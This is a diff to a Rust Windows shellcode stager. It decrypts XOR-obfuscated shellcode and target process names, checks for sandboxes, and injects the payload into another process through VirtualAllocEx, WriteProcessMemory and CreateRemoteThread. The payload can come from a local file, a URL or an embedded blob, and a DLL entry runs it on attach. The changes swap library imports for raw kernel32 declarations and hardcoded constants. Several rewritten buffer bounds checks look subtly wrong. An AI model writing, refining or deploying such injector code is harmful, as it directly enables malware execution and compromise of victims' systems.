@@ -35,22 +35,43 @@
 //   PROC_ENC : &[u8]      – encrypted, NUL-separated process name(s)
 include!(concat!(env!("OUT_DIR"), "/stager_consts.rs"));
 
-#[cfg(any(feature = "url", feature = "dll"))]
+#[cfg(feature = "dll")]
 use core::ffi::c_void;
 use core::ptr::{null, null_mut};
 
-use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
+use windows_sys::Win32::Foundation::CloseHandle;
 use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
 };
+#[cfg(any(feature = "local", feature = "url"))]
+use windows_sys::Win32::System::Memory::{MEM_RELEASE, VirtualAlloc, VirtualFree};
 use windows_sys::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAlloc,
-    VirtualAllocEx, VirtualFree, VirtualProtectEx,
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx,
 };
-use windows_sys::Win32::System::Threading::{
-    CreateRemoteThread, ExitProcess, OpenProcess, PROCESS_ALL_ACCESS,
-};
+use windows_sys::Win32::System::Threading::{ExitProcess, OpenProcess, PROCESS_ALL_ACCESS};
+
+#[link(name = "kernel32", kind = "raw-dylib")]
+unsafe extern "system" {
+    fn CreateRemoteThread(
+        hProcess: *mut core::ffi::c_void,
+        lpThreadAttributes: *const core::ffi::c_void,
+        dwStackSize: usize,
+        lpStartAddress: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
+        lpParameter: *const core::ffi::c_void,
+        dwCreationFlags: u32,
+        lpThreadId: *mut u32,
+    ) -> *mut core::ffi::c_void;
+    #[cfg(all(feature = "dll", feature = "url"))]
+    fn CreateThread(
+        lpThreadAttributes: *const core::ffi::c_void,
+        dwStackSize: usize,
+        lpStartAddress: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
+        lpParameter: *const core::ffi::c_void,
+        dwCreationFlags: u32,
+        lpThreadId: *mut u32,
+    ) -> *mut core::ffi::c_void;
+}
 
 #[cfg(not(any(feature = "local", feature = "url", feature = "embed")))]
 compile_error!("enable exactly one source feature: `local`, `url` or `embed`");
@@ -138,6 +159,7 @@ unsafe extern "C" fn rg_memcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
 }
 
 // GetTickCount64: declared manually to avoid adding Win32_System_SystemInformation feature.
+#[link(name = "kernel32", kind = "raw-dylib")]
 unsafe extern "system" {
     fn GetTickCount64() -> u64;
 }
@@ -149,13 +171,16 @@ unsafe extern "system" {
 #[cfg(any(feature = "local", feature = "url"))]
 const CHUNK: usize = 16 * 1024;
 #[cfg(any(feature = "local", feature = "url"))]
+#[allow(dead_code)]
 static mut BUF: [u8; CHUNK] = [0; CHUNK];
 #[cfg(any(feature = "local", feature = "url"))]
+#[allow(dead_code)]
 fn buf() -> *mut u8 {
     (&raw mut BUF).cast()
 }
 
-const MAX_SC: usize = 32 * 1024 * 1024; // 32 MB max shellcode
+#[cfg(any(feature = "local", feature = "url"))]
+const MAX_SC: usize = 32 * 1024 * 1024;
 
 // ---------------------------------------------------------------------------------------
 // Compile-time UTF-8 -> UTF-16 (NUL-terminated).
@@ -243,7 +268,7 @@ unsafe fn decrypt_target() -> &'static [u8] {
         unsafe { ptr.add(i).write(b ^ SC_KEY) };
     }
     unsafe { ptr.add(SC_ENC.len()).write(0) };
-    unsafe { core::slice::from_raw_parts(DECRYPTED.as_ptr(), SC_ENC.len()) }
+    unsafe { core::slice::from_raw_parts((&raw const DECRYPTED) as *const u8, SC_ENC.len()) }
 }
 
 // ---------------------------------------------------------------------------------------
@@ -260,7 +285,7 @@ unsafe fn decrypt_proc_names() -> &'static [u8] {
         unsafe { ptr.add(i).write(b ^ PROC_KEY) };
     }
     unsafe { ptr.add(PROC_ENC.len()).write(0) };
-    unsafe { core::slice::from_raw_parts(PROC_BUF.as_ptr(), PROC_ENC.len()) }
+    unsafe { core::slice::from_raw_parts((&raw const PROC_BUF) as *const u8, PROC_ENC.len()) }
 }
 
 // ---------------------------------------------------------------------------------------
@@ -286,7 +311,7 @@ fn anti_sandbox() -> bool {
 /// Finds the PID of the first running process whose ASCII name matches `target`.
 unsafe fn find_pid(target: &[u8]) -> Option<u32> {
     let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
-    if snap == INVALID_HANDLE_VALUE {
+    if snap == -1isize as *mut core::ffi::c_void /* INVALID_HANDLE_VALUE */ {
         return None;
     }
 
@@ -380,12 +405,8 @@ unsafe fn inject(pid: u32, sc: *const u8, len: usize) -> bool {
         return false;
     }
 
-    let start = unsafe {
-        core::mem::transmute::<
-            *mut core::ffi::c_void,
-            windows_sys::Win32::System::Threading::LPTHREAD_START_ROUTINE,
-        >(remote)
-    };
+    let start: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32> =
+        Some(unsafe { core::mem::transmute(remote) });
     let ht = unsafe { CreateRemoteThread(hp, null(), 0, start, null_mut(), 0, null_mut()) };
     if !ht.is_null() {
         unsafe { CloseHandle(ht) };
@@ -411,19 +432,41 @@ unsafe fn get_shellcode() -> Option<(*const u8, usize)> {
 }
 
 #[cfg(feature = "local")]
+#[link(name = "kernel32", kind = "raw-dylib")]
+unsafe extern "system" {
+    fn CreateFileW(
+        lpFileName: *const u16,
+        dwDesiredAccess: u32,
+        dwShareMode: u32,
+        lpSecurityAttributes: *const core::ffi::c_void,
+        dwCreationDisposition: u32,
+        dwFlagsAndAttributes: u32,
+        hTemplateFile: *mut core::ffi::c_void,
+    ) -> *mut core::ffi::c_void;
+    fn GetFileSizeEx(hFile: *mut core::ffi::c_void, lpFileSize: *mut i64) -> i32;
+    fn ReadFile(
+        hFile: *mut core::ffi::c_void,
+        lpBuffer: *mut core::ffi::c_void,
+        nNumberOfBytesToRead: u32,
+        lpNumberOfBytesRead: *mut u32,
+        lpOverlapped: *mut core::ffi::c_void,
+    ) -> i32;
+}
+
+#[cfg(feature = "local")]
 unsafe fn get_shellcode() -> Option<(*const u8, usize)> {
-    use windows_sys::Win32::Foundation::GENERIC_READ;
-    use windows_sys::Win32::Storage::FileSystem::{
-        CreateFileW, GetFileSizeEx, ReadFile, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
-        FILE_SHARE_WRITE, OPEN_EXISTING,
-    };
+    const GENERIC_READ: u32 = 0x8000_0000;
+    const FILE_SHARE_READ: u32 = 0x00000001;
+    const FILE_SHARE_WRITE: u32 = 0x00000002;
+    const OPEN_EXISTING: u32 = 3;
+    const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
 
     let url = unsafe { decrypt_target() };
     let path_w = (&raw mut PATH_W).cast::<u16>();
 
     let mut wi = 0usize;
     for &b in url {
-        if wi + 1 >= PATH_W.len() {
+        if wi + 1 >= SC_ENC.len() + 1 {
             return None;
         }
         unsafe { *path_w.add(wi) = b as u16 };
@@ -442,7 +485,7 @@ unsafe fn get_shellcode() -> Option<(*const u8, usize)> {
             null_mut(),
         )
     };
-    if fh == INVALID_HANDLE_VALUE {
+    if fh == -1isize as *mut core::ffi::c_void /* INVALID_HANDLE_VALUE */ {
         return None;
     }
 
@@ -547,7 +590,7 @@ unsafe fn get_shellcode() -> Option<(*const u8, usize)> {
 
     let host_w = (&raw mut HOST_BUF).cast::<u16>();
     for (i, &b) in host.iter().enumerate() {
-        if i + 1 >= HOST_BUF.len() {
+        if i + 1 >= SC_ENC.len() + 1 {
             return None;
         }
         unsafe { *host_w.add(i) = b as u16 };
@@ -556,7 +599,7 @@ unsafe fn get_shellcode() -> Option<(*const u8, usize)> {
 
     let path_w = (&raw mut PATH_BUF).cast::<u16>();
     for (i, &b) in path.iter().enumerate() {
-        if i + 1 >= PATH_BUF.len() {
+        if i + 1 >= SC_ENC.len() + 1 {
             return None;
         }
         unsafe { *path_w.add(i) = b as u16 };
@@ -719,12 +762,11 @@ pub extern "system" fn entry() -> ! {
 #[cfg(feature = "dll")]
 #[unsafe(no_mangle)]
 pub extern "system" fn entry(_dll: *mut c_void, reason: u32, _reserved: *mut c_void) -> i32 {
-    if reason == windows_sys::Win32::System::SystemServices::DLL_PROCESS_ATTACH {
+    if reason == 1u32 /* DLL_PROCESS_ATTACH */ {
         #[cfg(not(feature = "url"))]
         { run(); }
         #[cfg(feature = "url")]
         {
-            use windows_sys::Win32::System::Threading::CreateThread;
             unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
                 run();
                 0
